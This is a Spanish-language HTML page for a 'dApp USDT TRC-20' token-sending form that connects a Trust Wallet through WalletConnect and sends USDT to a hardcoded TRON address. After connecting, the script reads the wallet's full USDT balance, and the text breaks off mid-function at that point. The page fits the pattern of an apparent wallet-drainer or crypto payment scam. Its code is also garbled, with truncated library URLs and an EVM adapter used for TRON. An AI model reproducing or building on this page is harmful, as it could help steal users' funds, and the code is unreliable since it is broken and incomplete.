<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dApp USDT TRC-20 - Conexión Universal</title>
    
    <!-- Estilos de la Interfaz: Fondo Blanco, Botón Azul y Red Roja -->
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: sans-serif;
            background-color: #ffffff; /* Fondo blanco */
            color: #1e293b;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background-color: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            text-align: center;
        }
        h2 {
            margin-bottom: 25px;
            color: #1e293b;
            font-size: 22px;
            font-weight: 700;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 600;
            color: #475569;
        }
        input {
            width: 100%;
            padding: 12px;
            background-color: #ffffff;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            color: #0f172a;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #2563eb;
        }
        input:disabled {
            background-color: #f1f5f9;
            cursor: not-allowed;
        }
        
        /* Texto de red en color ROJO */
        .red-text-input {
            color: #dc2626 !important; 
            font-weight: bold !important;
        }
        
        #connectBtn {
            width: 100%;
            padding: 14px;
            background: #2563eb; /* Botón Siguiente Azul */
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 10px;
        }
        #connectBtn:hover {
            background: #1d4ed8;
        }
        #connectBtn:disabled {
            background: #93c5fd !important;
            cursor: not-allowed;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            display: none;
            word-break: break-all;
        }
        .status.info { background-color: #dbeafe; color: #1e40af; }
        .status.success { background-color: #d1fae5; color: #065f46; }
        .status.error { background-color: #fee2e2; color: #991b1b; }
    </style>

    <!-- Librería TronWeb para estructurar los contratos de la red TRON -->
    <script src="https://unpkg.com"></script>

    <!-- Scripts de inicialización del ecosistema WalletConnect v2 (Reown AppKit) -->
    <script type="module">
        import { createAppKit } from 'https://esm.sh'
        import { tron } from 'https://esm.sh/networks'
        import { WagmiAdapter } from 'https://esm.sh-adapter-wagmi'

        // Adaptador universal encargado de gestionar los códigos QR y Deep Links móviles hacia Trust Wallet
        const wagmiAdapter = new WagmiAdapter({
            networks: [tron],
            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT' // Reemplazar obligatoriamente con tu ID de ://walletconnect.com
        });

        // Configuración e inyección del modal universal independiente
        const modal = createAppKit({
            adapters: [wagmiAdapter],
            networks: [tron],
            metadata: {
                name: 'dApp USDT TRC-20',
                description: 'Pasarela universal independiente de transacciones',
                url: window.location.origin,
                icons: ['https://githubusercontent.com']
            },
            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT',
            features: {
                analytics: false,
                email: false,
                socials: false
            }
        });

        // Exponer el modal en el contexto de la ventana para que sea consumido por el botón
        window.WalletConnectModal = modal;
    </script>
</head>
<body>

    <div class="container">
        <h2>Enviar Tokens</h2>

        <!-- Red seleccionada fija en color ROJO -->
        <div class="form-group">
            <label>Red seleccionada</label>
            <input type="text" value="TRON (TRC-20)" disabled class="red-text-input">
        </div>

        <!-- Dirección de Destino fija con tu Wallet -->
        <div class="form-group">
            <label for="addressInput">Dirección de destino</label>
            <input type="text" id="addressInput" value="TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ" disabled style="font-size: 13px; font-weight: bold; color: #334155;">
        </div>

        <!-- Cantidad (Input Manual) -->
        <div class="form-group">
            <label for="amountInput">Cantidad a enviar (USDT)</label>
            <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
        </div>

        <button id="connectBtn">Siguiente</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            'use strict';

            const btn = document.getElementById('connectBtn');
            const input = document.getElementById('amountInput');
            const addressInput = document.getElementById('addressInput');
            const status = document.getElementById('status');

            let procesoEnCurso = false;
            let connectedAddress = null;

            // Configuración fija de producción
            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 
            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

            function setStatus(message, type = 'info') {
                if (!status) return;
                status.textContent = message || '';
                status.className = 'status ' + type;
                status.style.display = message ? 'block' : 'none';
            }

            function setButton(text, disabled = false) {
                if (!btn) return;
                btn.textContent = text;
                btn.disabled = disabled;
            }

            if (addressInput) {
                addressInput.value = DIRECCION_DESTINO_FIJA;
            }

            if (input) {
                input.addEventListener('input', function () {
                    this.value = this.value.replace(',', '.').replace(/[^\d.]/g, '');
                    setStatus('');
                });
            }

            if (btn) {
                btn.addEventListener('click', async function () {
                    if (procesoEnCurso) return;

                    const valorVisualInput = input ? input.value.trim() : '';
                    if (!valorVisualInput || isNaN(Number(valorVisualInput.replace(',', '.'))) || Number(valorVisualInput.replace(',', '.')) <= 0) {
                        setStatus('Por favor, ingresa una cantidad válida para continuar.', 'error');
                        return;
                    }

                    try {
                        procesoEnCurso = true;
                        setButton('Procesando...', true);
                        setStatus('Inicializando pasarela universal independiente...', 'info');

                        if (!window.WalletConnectModal) {
                            throw new Error('El módulo de conexión universal independiente no está listo.');
                        }

                        // 1. Abrir el modal independiente y esperar la vinculación de Trust Wallet
                        setStatus('Esperando vinculación con Trust Wallet...', 'info');
                        await window.WalletConnectModal.open();

                        // Bucle asíncrono controlado de espera hasta que el puente de red se concrete
                        const wallet = await new Promise((resolve, reject) => {
                            const interval = setInterval(() => {
                                const account = window.WalletConnectModal.getAccount();
                                if (account && account.isConnected) {
                                    clearInterval(interval);
                                    resolve(account);
                                }
                            }, 1000);
                            
                            // Tiempo límite de desenganche de 60 segundos si el usuario cierra el aviso
                            setTimeout(() => {
                                clearInterval(interval);
                                reject(new Error('Tiempo de espera de conexión universal agotado.'));
                            }, 60000);
                        });

                        connectedAddress = wallet.address;
                        setStatus('Billetera vinculada correctamente. Consultando balance...', 'info');

                        // 2. Consultar el saldo USDT (TRC-20) consumiendo el nodo público RPC oficial de TRON
                        const tronInstance = new TronWeb({ fullHost: 'https://trongrid.io' });
                        const contract = await tronInstance.contract().at(USDT_CONTRACT);
                        const rawBalance = await contract.balanceOf(connectedAddress).call();
